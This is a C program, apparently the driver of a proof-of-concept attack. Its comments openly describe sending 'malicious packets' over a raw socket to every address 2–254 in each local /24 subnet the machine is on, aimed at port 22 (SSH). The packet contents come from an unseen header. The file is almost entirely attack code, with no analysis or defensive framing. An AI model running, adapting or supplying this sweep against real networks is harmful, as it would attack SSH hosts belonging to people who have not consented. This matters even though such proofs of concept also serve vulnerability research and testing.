#include <ifaddrs.h>
#include "send_packet.h"

// Find all the network interfaces that we are attached to and send
// out malicious packets to similar IP addresses. For example, if
// one of our IP addresses is 192.168.0.13, then we will send malicious
// packets to all addresses in the range 192.168.0.1-255.
int main(int argc, char *argv[])
{
  struct ifaddrs *ifaddr;

  // Create a raw socket for sending the malicious packets.
  const int sock = create_raw_socket();
  if (sock < 0) {
    printf("Failed to create socket. Try running with sudo.\n");
    return 1;
  }

  // Get the network interfaces that we are attached to.
  if (getifaddrs(&ifaddr) < 0) {
    printf("getifaddrs failed");
    return 1;
  }

  // Loop over the network interfaces.
  struct ifaddrs *ifa;
  for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
    if (ifa->ifa_addr == NULL)
      continue;

    if (ifa->ifa_addr->sa_family == AF_INET) {
      struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
      printf("%s: %s\n", ifa->ifa_name, inet_ntoa(addr->sin_addr));

      // Send out malicious packets to 253 similar IP addresses, by
      // cycling through the final byte of the address. We skip values
      // 0, 1, and 255 because they are not valid.
      const uint16_t dst_port = ntohs(22);
      const uint16_t src_port = ntohs(1234);
      const uint32_t src = ntohl(addr->sin_addr.s_addr);
      const uint32_t dst = src & 0xFFFFFF00;
      size_t i;
      for (i = 2; i < 255; i++) {
        const int r0 = send_packet(
          sock, htonl(src), src_port, htonl(dst | i), dst_port, 0, 0, 1, 0
        );
        if (r0 < 0) {
          printf("send failed %s %ld\n", ifa->ifa_name, i);
          break;
        }
      }
    }
  }

  freeifaddrs(ifaddr);

  const int r1 = close(sock);
  if (r1 < 0) {
    printf("could not close socket.\n");
    return -1;
  }

  return 0;
}
